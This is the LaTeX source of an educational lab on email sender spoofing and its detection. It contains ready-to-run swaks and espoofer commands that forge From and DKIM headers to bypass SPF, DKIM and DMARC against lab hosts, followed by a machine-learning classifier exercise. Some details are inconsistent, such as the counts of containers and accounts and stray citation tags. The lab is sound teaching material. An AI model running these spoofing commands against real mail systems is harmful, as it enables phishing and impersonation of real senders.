%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Email Spoofing & ML-Based Detection Lab                        %%
%%  Based on the SEED Labs template by Wenliang Du                 %%
%%  Creative Commons Attribution-NonCommercial-ShareAlike 4.0      %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\documentclass[11pt]{article}

%% ── Packages ──────────────────────────────────────────────────────
\usepackage{geometry}
% setting the geometry
\geometry{
	top=1in,
	bottom=0.5in,
	left=0.85in,
	right=0.85in,
%	header=0.75in,
%	footer=0.5in
}

\usepackage{fancyhdr}
\usepackage{listings}
\usepackage{enumitem}
\usepackage{hyperref}
\usepackage{xcolor}
\usepackage{graphicx}
\usepackage{titlesec}
\usepackage{parskip}
\usepackage{booktabs}
\usepackage{caption}
\usepackage{mdframed}
\usepackage{minted}
\usepackage{setspace}
\usepackage{tabularx}
\usepackage{array}

%% ── Listings style (monospaced code boxes) ────────────────────────
\lstset{
  basicstyle=\ttfamily\small,
  backgroundcolor=\color{gray!10},
  frame=single,
  framerule=0.4pt,
  rulecolor=\color{gray!60},
  breaklines=true,
  breakatwhitespace=true,
  showstringspaces=false,
  tabsize=4,
  xleftmargin=6pt,
  xrightmargin=6pt,
  aboveskip=6pt,
  belowskip=6pt,
}

\definecolor{bg}{rgb}{0.95, 0.95, 0.95}
\usemintedstyle{native}
\setminted{
    linenos,
    frame=none,
    numbersep=6pt,
    framesep=2mm,
    bgcolor=bg,
    fontsize=\large,
    xleftmargin=\parindent
}

%% ── Headers / footers ─────────────────────────────────────────────
\pagestyle{fancy}
\fancyhf{}
\lhead{\bfseries SEED Labs -- Hardening Email Sender Authentication}
\rhead{\thepage}
\renewcommand{\headrulewidth}{0.4pt}

%% ── Task counter ──────────────────────────────────────────────────
\newcounter{task}
\setcounter{task}{1}
\newcommand{\tasks}{%
  \textbf{(\arabic{task})}\addtocounter{task}{1}\,}

%% ── Note / warning box ────────────────────────────────────────────
\newmdenv[
  linecolor=orange!70,
  backgroundcolor=orange!8,
  linewidth=1pt,
  innerleftmargin=8pt,
  innerrightmargin=8pt,
  innertopmargin=6pt,
  innerbottommargin=6pt,
]{notebox}

\newmdenv[
  linecolor=blue!50,
  backgroundcolor=blue!5,
  linewidth=1pt,
  innerleftmargin=8pt,
  innerrightmargin=8pt,
  innertopmargin=6pt,
  innerbottommargin=6pt,
]{infobox}

%% ══════════════════════════════════════════════════════════════════
\begin{document}
%% ══════════════════════════════════════════════════════════════════

\begin{center}
  {\LARGE\bfseries Hardening Email Sender Authentication}\\[6pt]
  {\large Exploiting SPF, DKIM, and DMARC --- and Building a Defence}
\end{center}

\vspace{4pt}
\noindent\rule{\linewidth}{0.6pt}
\vspace{4pt}

\noindent
Copyright \textcopyright{} 2026.
This lab is released under the
\href{http://creativecommons.org/licenses/by-nc-sa/4.0/}{Creative
Commons Attribution-NonCommercial-ShareAlike 4.0 International License}.

\vspace{8pt}

%% ══════════════════════════════════════════════════════════════════
\section{Overview}
%% ══════════════════════════════════════════════════════════════════

Email remains one of the most widely abused communication channels for
impersonation and phishing attacks.
Over the last two decades, three authentication protocols have been
standardised to combat email sender spoofing:
\textbf{SPF} (Sender Policy Framework),
\textbf{DKIM} (DomainKeys Identified Mail), and
\textbf{DMARC} (Domain-based Message Authentication, Reporting and
Conformance).
Despite their widespread adoption, real-world deployments are riddled
with misconfigurations and implementation weaknesses that allow a
determined attacker to bypass all three layers simultaneously.

This lab has two complementary objectives:

\begin{enumerate}[noitemsep]
  \item \textbf{Attack.} Students will exploit deliberate
    misconfigurations in a controlled email infrastructure to deliver
    spoofed messages that pass (or are not rejected by) SPF, DKIM, and
    DMARC checks.
  \item \textbf{Defend.} Students will train and evaluate a
    machine-learning classifier that analyses email headers and metadata
    to flag spoofed messages, providing a last line of defence when
    protocol-level checks fail.
\end{enumerate}

\paragraph{Topics covered.}
\begin{itemize}[noitemsep]
  \item How SPF, DKIM, and DMARC work and interact
  \item Common misconfigurations that enable spoofing (soft-fail SPF,
    missing DKIM, DMARC \texttt{p=none})
  \item Direct MTA attacks using \texttt{swaks} and \texttt{espoofer}
  \item Header-injection and envelope/header \texttt{From} mismatch
    attacks
  \item Feature engineering from email headers for ML-based detection
  \item Evaluating a classifier against known spoofing patterns
\end{itemize}

\paragraph{Readings.}
\begin{itemize}[noitemsep]
  \item RFC 7208 (SPF), RFC 6376 (DKIM), RFC 7489 (DMARC)
  \item J.\ Chen, V.\ Paxson, J.\ Jiang ---
    \textit{Composition Kills: A Case Study of Email Sender
    Authentication}, USENIX Security 2020
    (included in \texttt{containers\_setup/espoofer/papers/})
  \item \url{https://github.com/chenjj/espoofer} --- \texttt{espoofer} tool
    documentation
\end{itemize}

\paragraph{Lab Environment.}
All tasks run inside a Docker Compose network (\texttt{net-10.9.0.0/24})
that you will set up using the provided scripts.
No external Internet access is required for the attack tasks.
A host machine with Docker and Docker Compose installed is sufficient.
This lab has been developed and tested on the official SEED Labs
Ubuntu~20.04 virtual machine.

%% ══════════════════════════════════════════════════════════════════
\section{Lab Environment}
%% ══════════════════════════════════════════════════════════════════

\subsection{Container Architecture}

The lab uses four containers connected on the \texttt{10.9.0.0/24}
subnet.
Table~\ref{tab:containers} summarises each container's role.

\begin{table}[h]
\centering
\caption{Docker containers and their roles}
\label{tab:containers}
\begin{tabularx}{\textwidth}{@{} l l l >{\raggedright\arraybackslash}X @{}}
\toprule
\textbf{Container} & \textbf{IP} & \textbf{Image} & \textbf{Role} \\
\midrule
\texttt{dns-server-10.9.0.5}
  & \texttt{10.9.0.5}
  & Custom BIND9
  & Authoritative DNS for both domains \\
\texttt{victim-mail-10.9.0.6}
  & \texttt{10.9.0.6}
  & \texttt{docker-mailserver}
  & Postfix/Dovecot mail server (\texttt{victim.test}) \\
\texttt{attacker-sender-10.9.0.7}
  & \texttt{10.9.0.7}
  & \texttt{seed-ubuntu:large}
  & Attack workstation \\
\bottomrule
\end{tabularx}
\end{table}


\paragraph{DNS zones.}
Two DNS zones are served by the BIND9 container:

\begin{itemize}[noitemsep]
  \item \textbf{\texttt{victim.test}} --- the target domain, configured
    with intentional weaknesses: SPF soft-fail (\texttt{\textasciitilde
    all}), no DKIM selector published, and DMARC policy
    \texttt{p=none} (monitoring only).
  \item \textbf{\texttt{attacker.test}} --- the attacker's domain, with
    a valid SPF record authorising \texttt{10.9.0.7}, a DKIM public key,
    and a permissive DMARC record.
\end{itemize}

\paragraph{Mail accounts.}
The victim mail server hosts two accounts:
\begin{listing}[H]
\begin{minted}{text}
alice@victim.test   password: pass123
bob@victim.test     password: 123pass
user@victim.test    (hashed, for postfix-accounts.cf)
\end{minted}
\end{listing}

\begin{listing}[H]
\begin{minted}{text}
# Exposed ports (host machine)
SMTP:  localhost:2525  ->  victim-mail:25
IMAP:  localhost:1143  ->  victim-mail:143
\end{minted}
\end{listing}

\subsection{Setup and Commands}

\paragraph{Step 1 --- Start the containers.}
From the root of the \texttt{containers\_setup} directory:

\begin{listing}[H]
\begin{minted}{text}
$ dcdown          # to bring down running containers, if needed
$ dcup -d                    
$ dockps          # verify all three containers are running
\end{minted}
\end{listing}

\paragraph{Step 2 --- Run the first-time initialisation script.}
Open a shell inside the attacker container and run the setup script
\emph{once}:

\begin{listing}[H]
\begin{minted}{text}
$ docksh attacker-sender-10.9.0.7
(attacker)$ cd /home/seed/init_setup
(attacker)$ bash run-me-1st.sh
\end{minted}
\end{listing}

This script updates the system, installs \texttt{swaks}, and installs
the Python dependencies required by \texttt{espoofer}.

\paragraph{Step 3 --- Verify DNS resolution.}
Still inside the attacker container, confirm that the custom DNS server
is resolving both zones correctly:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ dig MX victim.test @10.9.0.5
(attacker)$ dig TXT victim.test @10.9.0.5
(attacker)$ dig TXT _dmarc.victim.test @10.9.0.5
\end{minted}
\end{listing}

\begin{listing}[H]
\begin{minted}{text}
$ dcdown # stops the containers
\end{minted}    

\end{listing}

%% ══════════════════════════════════════════════════════════════════
\section{Task 1: Per-Protocol Configurations and \texttt{swaks} Attacks}
%% ══════════════════════════════════════════════════════════════════

The sender-authentication behaviour for \texttt{victim.test} is
controlled by DNS records defined in the BIND zone file \texttt{containers\_setup/bind/zones/db.victim.test}.


By commenting and uncommenting specific lines in this file, we can
simulate four different deployment scenarios:

\begin{enumerate}[noitemsep]
  \item no sender authentication at all,
  \item SPF only,
  \item DKIM only,
  \item DMARC only.
\end{enumerate}

In each sub-task below, you will:

\begin{itemize}[noitemsep]
  \item edit \texttt{db.victim.test} to obtain the desired configuration,
  \item reload the DNS server and verify the records using \texttt{dig},
  \item craft a \texttt{swaks} command that sends a spoofed email under
        that configuration,
  \item retrieve the message and analyse the authentication-related
        headers.
\end{itemize}

You should both run the commands directly in the shell and encode your
final attack commands into the provided
\texttt{/home/seed/attacks/attack.sh} script so that you can easily
repeat each attack during later tasks.

\subsection{Task 1.1 --- No Authentication}

In this baseline scenario, \texttt{victim.test} publishes \emph{no} SPF,
DKIM, or DMARC records at all: receivers have no protocol-level
information about who is allowed to send mail for this domain.[file:4]

\paragraph{Step 1: Disable all authentication records.}
Open \texttt{db.victim.test} and ensure that the SPF and DMARC lines are
commented out, and that no DKIM selector records are present, e.g.:

\begin{listing}[H]
\begin{minted}{text}
; --- INTENTIONAL MISCONFIGURATIONS (for Task 1.1) ---

; SPF: disabled
; @       IN  TXT     "v=spf1 mx ~all"

; DKIM: no selector/_domainkey record for victim.test

; DMARC: disabled
; _dmarc IN TXT "v=DMARC1; p=none; aspf=r; adkim=r"
\end{minted}
\end{listing}

Reload the DNS server (using the provided helper script or \texttt{rndc
reload}) and verify that no SPF or DMARC records exist:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ dig TXT victim.test @10.9.0.5
(attacker)$ dig TXT _dmarc.victim.test @10.9.0.5
\end{minted}
\end{listing}

\paragraph{Step 2: Spoofed email with no authentication.}
Send a spoofed email that pretends to come from the CEO at
\texttt{victim.test}:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ swaks \
  --from attacker@victim.test \
  --to bob@victim.test \
  --server 10.9.0.6 --port 25 \
  --helo attacker.attacker.test \
  --header "From: CEO <ceo@victim.test>" \
  --header "Subject: No-auth baseline" \
  --body "This is a spoofed email with no auth at all."
\end{minted}
\end{listing}

Retrieve the message from Bob's inbox (via IMAP) and examine the full
headers.

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item Which, if any, \texttt{Authentication-Results} fields are
        present (for SPF, DKIM, or DMARC)?
  \item Does the message reach Bob's inbox? If so, what evidence (if
        any) would allow a human user or filter to detect spoofing?
  \item How difficult would it be for an attacker to impersonate other
        users at \texttt{victim.test} in this configuration?
\end{enumerate}

\subsection{Task 1.2 --- SPF-Only Deployment}

In this scenario, \texttt{victim.test} publishes an SPF record but no
DKIM or DMARC records.[file:4]

\paragraph{Step 1: Enable SPF, keep DKIM and DMARC disabled.}
Edit \texttt{db.victim.test} so that the SPF line is active, while
DKIM and DMARC remain disabled:

\begin{listing}[H]
\begin{minted}{text}
; SPF: enabled (soft-fail policy)
@       IN  TXT     "v=spf1 mx ~all"

; DKIM: still no selector/_domainkey record for victim.test

; DMARC: disabled
; _dmarc IN TXT "v=DMARC1; p=none; aspf=r; adkim=r"
\end{minted}
\end{listing}

Reload the DNS server and verify:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ dig TXT victim.test @10.9.0.5          # shows SPF
(attacker)$ dig TXT _dmarc.victim.test @10.9.0.5   # no DMARC record
\end{minted}
\end{listing}

\paragraph{Step 2: SPF-based spoofing with envelope/header mismatch.}
SPF checks the \emph{envelope sender} (SMTP \texttt{MAIL FROM}) and
ignores the visible \texttt{From:} header.
Exploit this by using an envelope sender authorised by SPF while
forging the visible \texttt{From:} address.

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ swaks \
  --from attacker@attacker.test \
  --to bob@victim.test \
  --server 10.9.0.6 --port 25 \
  --helo attacker.test \
  --header "From: Alice <alice@victim.test>" \
  --header "Subject: SPF-only bypass" \
  --body "Hi Bob, this looks like it came from Alice."
\end{minted}
\end{listing}

Retrieve the message and inspect the \texttt{Authentication-Results} and
\texttt{Received-SPF} headers.

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item What is the \texttt{spf=} result for this message? Why?
  \item What domain appears in the visible \texttt{From:} header?
  \item Does SPF, by itself, prevent Bob from being fooled by this
        message?
  \item How would changing the SPF record to use \texttt{-all}
        (hard-fail) instead of \texttt{\textasciitilde all}
        (soft-fail) affect this attack?
\end{enumerate}

\subsection{Task 1.3 --- DKIM-Only Deployment}

In this scenario, \texttt{victim.test} uses DKIM signing but publishes
no SPF or DMARC records.
Receivers can, in principle, verify a cryptographic signature on the
message, but there is no DMARC policy tying that result to enforcement.[file:4]

\paragraph{Step 1: Publish a DKIM key, disable SPF/DMARC.}
Edit \texttt{db.victim.test} to disable SPF and DMARC while publishing a
DKIM selector (you may reuse the key generation steps later in the lab):

\begin{listing}[H]
\begin{minted}{text}
; SPF: disabled for Task 1.3
; @       IN  TXT     "v=spf1 mx ~all"

; DKIM: publish a selector for victim.test
default._domainkey IN TXT "v=DKIM1; k=rsa; p=YOUR_BASE64_PUBLIC_KEY"

; DMARC: disabled for Task 1.3
; _dmarc IN TXT "v=DMARC1; p=none; aspf=r; adkim=r"
\end{minted}
\end{listing}

Reload DNS and verify that the DKIM selector exists:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ dig TXT default._domainkey.victim.test @10.9.0.5
\end{minted}
\end{listing}

Configure the victim mail server so that legitimate outbound mail from
\texttt{victim.test} is signed with the corresponding private key, then
send a legitimate email from \texttt{alice@victim.test} to
\texttt{bob@victim.test} and confirm that \texttt{dkim=pass} appears in
\texttt{Authentication-Results}.

\paragraph{Step 2: Spoofed email with broken DKIM signature.}
Now craft a spoofed message that carries a syntactically valid but
cryptographically invalid DKIM signature.

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ swaks \
  --from alice@victim.test \
  --to bob@victim.test \
  --server 10.9.0.6 --port 25 \
  --helo attacker.attacker.test \
  --header "From: CEO <ceo@victim.test>" \
  --header "To: Bob <bob@victim.test>" \
  --header "Subject: DKIM-only bypass" \
  --header "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; \
d=victim.test; s=default; h=from:to:subject; \
bh=invalidhash; b=invaliddata" \
  --body "Spoofed mail with an invalid DKIM signature."
\end{minted}
\end{listing}

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item What is the \texttt{dkim=} result for this spoofed message?
  \item Does the message still reach Bob's inbox? Why might a receiver
        accept a message with \texttt{dkim=fail}?
  \item What additional policy or configuration would be required to
        reject messages with broken DKIM signatures?
\end{enumerate}

\subsection{Task 1.4 --- DMARC-Only Deployment}

DMARC is designed to enforce \emph{alignment} of authenticated identities
(from SPF and/or DKIM) with the visible \texttt{From:} domain.
If a domain publishes DMARC but does not deploy SPF or DKIM, DMARC has
no underlying authentication results to work with.[file:4]

\paragraph{Step 1: Enable DMARC, disable SPF/DKIM.}
Configure \texttt{db.victim.test} so that only the DMARC record is
active:

\begin{listing}[H]
\begin{minted}{text}
; SPF: disabled for Task 1.4
; @       IN  TXT     "v=spf1 mx ~all"

; DKIM: no selector/_domainkey record for victim.test
; default._domainkey IN TXT "v=DKIM1; k=rsa; p=..."

; DMARC: enabled, but depends on SPF/DKIM results
_dmarc IN TXT "v=DMARC1; p=none; aspf=r; adkim=r"
\end{minted}
\end{listing}

Reload DNS and verify:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ dig TXT victim.test @10.9.0.5          # no SPF
(attacker)$ dig TXT default._domainkey.victim.test @10.9.0.5  # no DKIM
(attacker)$ dig TXT _dmarc.victim.test @10.9.0.5   # DMARC present
\end{minted}
\end{listing}

\paragraph{Step 2: Spoofed email with DMARC-only configuration.}
Re-use a simple spoof similar to Task~1.1:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ swaks \
  --from attacker@victim.test \
  --to bob@victim.test \
  --server 10.9.0.6 --port 25 \
  --helo attacker.attacker.test \
  --header "From: CEO <ceo@victim.test>" \
  --header "Subject: DMARC-only bypass" \
  --body "DMARC is present, but SPF/DKIM are missing."
\end{minted}
\end{listing}

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item What are the \texttt{spf=}, \texttt{dkim=}, and \texttt{dmarc=}
        results in the \texttt{Authentication-Results} header?
  \item Why does DMARC, by itself, not prevent delivery of this spoofed
        message when SPF and DKIM are absent?
  \item How would the behaviour change if SPF and/or DKIM were properly
        deployed and DMARC were set to \texttt{p=quarantine} or
        \texttt{p=reject}?
\end{enumerate}

%% ══════════════════════════════════════════════════════════════════
\section{Task 2: Multi-Layer Bypass with \texttt{espoofer}}
%% ══════════════════════════════════════════════════════════════════

In Task~1 you exploited each protocol (SPF, DKIM, DMARC) in isolation
using \texttt{swaks}.
In this task, you will use the \texttt{espoofer} tool to craft attacks
that combine multiple bypass techniques and misconfigurations at once.

\subsection{Task 2.1 --- Exploring Available Attack Cases}

\texttt{espoofer} is a research tool that implements a catalogue of
known email-sender-authentication bypass techniques discovered by Chen,
Paxson, and Jiang (USENIX Security 2020).
It operates in three modes: \textit{server}, \textit{client}, and
\textit{manual}.
In this lab we use \textit{server} mode, where \texttt{espoofer} acts
as the sending MTA.

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ cd /home/seed/espoofer
(attacker)$ python3 espoofer.py -l
\end{minted}
\end{listing}

This lists all built-in attack cases.
Note the case identifiers (e.g. \texttt{server\_a1}, \texttt{server\_a2},
...).

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item How many distinct server-mode attack cases are available?
  \item Pick three cases and describe in your own words what
        authentication property (SPF, DKIM, DMARC, or their combination)
        each one exploits.
\end{enumerate}

\subsection{Task 2.2 --- Configuring \texttt{espoofer}}

Edit \texttt{/home/seed/espoofer/config.py} to target the lab
infrastructure:

\begin{listing}[H]
\begin{minted}{text}
config = {
  "attacker_site":          b"attacker.test",
  "legitimate_site_address": b"admin@victim.test",  # spoofed From:
  "victim_address":         b"bob@victim.test",     # target inbox
  "case_id":                b"server_a1",          # change to test others

  "server_mode": {
    "recv_mail_server":      "10.9.0.6",
    "recv_mail_server_port": 25,
    "starttls":              False,
  },
}
\end{minted}
\end{listing}

\subsection{Task 2.3 --- Running Combined Attacks}

Run \texttt{espoofer} using the configured case:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ python3 espoofer.py          # uses config.py settings
# OR override the case ID on the command line:
(attacker)$ python3 espoofer.py -id server_a2
\end{minted}
\end{listing}

For each chosen case, retrieve the message from Bob's inbox and examine
the \texttt{Authentication-Results} header.

\paragraph{Questions (repeat for at least 3 different case IDs).}
\begin{enumerate}[noitemsep]
  \item For each case, record the \texttt{spf=}, \texttt{dkim=}, and
        \texttt{dmarc=} results.
  \item Which cases result in \texttt{dmarc=pass} even when something
        suspicious is happening with SPF or DKIM?
  \item What does the \texttt{From:} header look like to Bob in each
        case?
  \item Relate each successful case back to the misconfigurations you
        exploited in Task~1 (SPF, DKIM, and DMARC).
  \item Explain, in protocol terms, why combining multiple weaknesses
        (a ``cocktail'' of bypasses) is more effective than any
        single technique alone.
\end{enumerate}

%% Optional: keep a short manual-mode exercise, if desired.
\subsection{Task 2.4 --- Optional: Manual-Mode Attack}

Use manual mode to craft a raw spoofed message with full control over
every header field:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ python3 espoofer.py -m m \
  -helo attacker.test \
  -mfrom attacker@attacker.test \
  -rcptto bob@victim.test \
  -ip 10.9.0.6 -port 25 \
  -data \
"From: Alice <alice@victim.test>\r\nSubject: Spoofing\r\n\r\nBody here."
\end{minted}
\end{listing}

\paragraph{Question.}
Explain what each flag controls at the SMTP protocol level and how it
relates to SPF, DKIM, or DMARC verification.

%% ══════════════════════════════════════════════════════════════════
\section{Task 3: ML-Based Spoofing Detection}
%% ══════════════════════════════════════════════════════════════════

In this task, you will build and evaluate a machine-learning classifier
that distinguishes spoofed emails from legitimate ones based on header
features.
You will specifically compare how well the classifier performs against
\emph{single-protocol} bypasses (Task~1) versus \emph{multi-layer}
\texttt{espoofer} attacks (Task~2).

\subsection{Task 3.1 --- Dataset Preparation}

Collect raw email headers from:
\begin{itemize}[noitemsep]
  \item legitimate emails (e.g.\ from Task~1 legitimate tests),
  \item single-protocol bypass attacks using \texttt{swaks} (Task~1.1--1.3),
  \item multi-layer bypass attacks using \texttt{espoofer} (Task~2).
\end{itemize}

For each email, extract features such as:
\begin{itemize}[noitemsep]
  \item \texttt{spf\_result} --- encoded as \texttt{pass}, \texttt{softfail},
        \texttt{fail}, \texttt{none};
  \item \texttt{dkim\_result} --- \texttt{pass}, \texttt{fail}, \texttt{none};
  \item \texttt{dmarc\_result} --- \texttt{pass}, \texttt{fail}, \texttt{none};
  \item \texttt{from\_return\_path\_mismatch} --- Boolean;
  \item \texttt{helo\_from\_mismatch} --- Boolean;
  \item \texttt{num\_received\_hops} --- count of \texttt{Received:} headers;
  \item other header-derived features you consider useful.
\end{itemize}

You may supplement your lab-generated emails with a public corpus
(e.g.\ SpamAssassin, CEAS 2008) to increase dataset size and class
balance.

\paragraph{Feature extraction hint.}
Python's \texttt{email} library can parse raw messages:

\begin{listing}[H]
\begin{minted}{text}
import email

with open("raw_message.eml", "r") as f:
    msg = email.message_from_file(f)

from_addr     = msg.get("From", "")
return_path   = msg.get("Return-Path", "")
auth_results  = msg.get("Authentication-Results", "")
received_hdrs = msg.get_all("Received", [])
\end{minted}
\end{listing}

\subsection{Task 3.2 --- Training a Baseline Classifier}

Train at least one \texttt{scikit-learn} classifier (e.g.\ Random Forest,
Logistic Regression, SVM) to predict whether an email is \emph{legitimate}
or \emph{spoofed} based on your feature set.

\begin{listing}[H]
\begin{minted}{text}
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, confusion_matrix

X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42, stratify=y)

clf = RandomForestClassifier(n_estimators=100, random_state=42)
clf.fit(X_train, y_train)

y_pred = clf.predict(X_test)
print(classification_report(y_test, y_pred,
      target_names=["Legitimate", "Spoofed"]))
print(confusion_matrix(y_test, y_pred))
\end{minted}
\end{listing}

Report precision, recall, F1-score, and accuracy for your classifier.

\subsection{Task 3.3 --- Single vs Multi-Layer Bypass Experiments}

To understand how well your classifier handles different kinds of
attacks, evaluate it separately on:
\begin{itemize}[noitemsep]
  \item the subset of \textbf{single-protocol} bypass emails
        (Task~1.1--1.3), and
  \item the subset of \textbf{multi-layer} \texttt{espoofer} emails
        (Task~2).
\end{itemize}

Compute and compare metrics (precision, recall, F1-score) for these two
subsets.

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item Is your classifier more effective at detecting single-protocol
        bypasses or multi-layer \texttt{espoofer} attacks? Explain why.
  \item Which features appear most important for detecting multi-layer
        attacks? Does this match your intuition from Tasks~1 and~2?
  \item Describe at least two ways an attacker could adapt their
        spoofing strategy to evade your classifier.
  \item What additional features or data sources would you recommend
        adding in a production-grade system (e.g.\ content features,
        sender reputation, behavioural signals)?
\end{enumerate}



%% ══════════════════════════════════════════════════════════════════
\section{Submission}
%% ══════════════════════════════════════════════════════════════════

Students should submit a lab report in PDF format containing:

\begin{enumerate}[noitemsep]
  \item \textbf{Environment verification} --- screenshots of running
    containers (\texttt{docker compose ps}) and successful DNS
    resolution.
  \item \textbf{Task answers} --- all numbered questions answered with
    supporting evidence (terminal output, header excerpts, screenshots).
  \item \textbf{Attack logs} --- the contents of
    \texttt{spf-spoof-attack.log} and relevant
    \texttt{Authentication-Results} headers for at least three
    \texttt{espoofer} cases.
  \item \textbf{ML results} --- the full \texttt{classification\_report}
    output, a confusion matrix, and the feature importance plot (or
    coefficient table) for your classifier.
  \item \textbf{Hardening evidence} --- before/after zone file excerpts
    and re-run attack outputs showing the effect of each hardening step.
  \item \textbf{Reflection} --- a short paragraph (200--300 words)
    discussing the limitations of both protocol-level defences and the
    ML classifier, and what a production-grade solution would look like.
\end{enumerate}

\begin{notebox}
\textbf{Academic integrity notice.}
All attacks in this lab must be conducted exclusively within the
provided Docker network.
Do not attempt any of these techniques against real email infrastructure.
\end{notebox}


%% ══════════════════════════════════════════════════════════════════
\section{Acknowledgements}
%% ══════════════════════════════════════════════════════════════════

\begin{itemize}[noitemsep]
  \item The \texttt{espoofer} tool is developed by Jianjun Chen, Vern
    Paxson, and Jian Jiang and is available at
    \url{https://github.com/chenjj/espoofer}.
  \item The container infrastructure (DNS, mail server, and attacker
    workstation) was developed as part of the course project.
  \item The lab format is inspired by the SEED Security Lab series
    by Wenliang Du, Syracuse University
    (\url{https://seedsecuritylabs.org}).
\end{itemize}

\end{document}